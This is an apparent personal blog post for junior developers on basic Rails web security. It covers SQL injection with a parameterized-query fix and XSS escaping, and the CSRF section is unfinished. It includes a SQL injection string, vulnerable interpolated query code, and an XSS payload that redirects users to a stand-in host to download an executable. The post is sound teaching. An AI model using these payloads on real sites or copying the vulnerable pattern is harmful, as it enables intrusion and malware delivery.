---
layout: post
title:      "Basic Security "
date:       2019-10-06 20:20:17 -0400
permalink:  basic_security
---

With all the hacks against big companies and sensitive data being compromised even if your, not a web-security expert it should be on your mind.
 
 There are 3 major ones that all Junior developers should be aware of as they start to build and write code. These are some of the basic definitions from Wikpedia.

1. SQL Injection - “An attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data “ 
2. Cross-Site Scripting (XSS)-enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls
3. Cross-site request forgery is a type of malicious exploit of a website where unauthorized commands are transmitted from a user that the web application trusts.

## SQL Injection
Why is it so scary ,first even a non-sesoned hacker with very basic coding skills can gain access to some of the info in a DB. Second, any form that is submitting data is bypassing all firewall and security measures and so we can update the info in the DB. What is stopping the user from injecting some SQL query to retrieve data? I will not get into specifics of what can be done as that would be liking giving a loaded gun to a child. I will just mention some measures that are taken to prevent such hacks.

In rails when we use active record as gateway to our DB . But whaf if my name is ```  ' OR 1='1``` 

```User.where("name = '#{params[:name]'") # SQL Injection!```

Because now we are saying  give me a user whose name is  blank  or if 1=1 (which is true) so then return the whole table (OOHH )


```User.where(["name = ?", "#{params[:name]}"])```

We don't pass in a string directly but use “?“ as template or placeholder for the parameters.In this example we are clearly stating how to make the query! This is just one example if we are even just aware of the vulnerabilities,that will help us in finding the correct solution.







## Cross-Site Scripting (XSS)
I wrote about this [here](http://simchagreenbaum.com/securing_a_rails_app) how Rails pervents  any user input that will be diplayed and wont execute any HTML 
```<script>alert('x');</script> ```

If you are using JS you need to make sure that any input will escape the HTML and make sure it doesn't have the ability to execute any scripts.Why are scripts so bad ?  We could have a legitmate website that will run a script on the client  side. What if  we entered this into an input form?

```<script>document.location="http://www.badwebsite.com/download.exe";</script>```

On load, this will send the user to a different URL which will download the file. This is a huge topic but the point is to understand that any input form or search bar on a website can be vulnerable.  



## Cross-site Request Forgery
**Stay tuned-coming  next week**



All the best,

Simcha Greenbaum



References

1. [SQl Injection](https://www.beyondsecurity.com/about-sql-injection.html)
2. [CSRF](https://medium.com/rubyinside/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef)
3. [Web-Security](http://simchagreenbaum.com/Web-Security) 




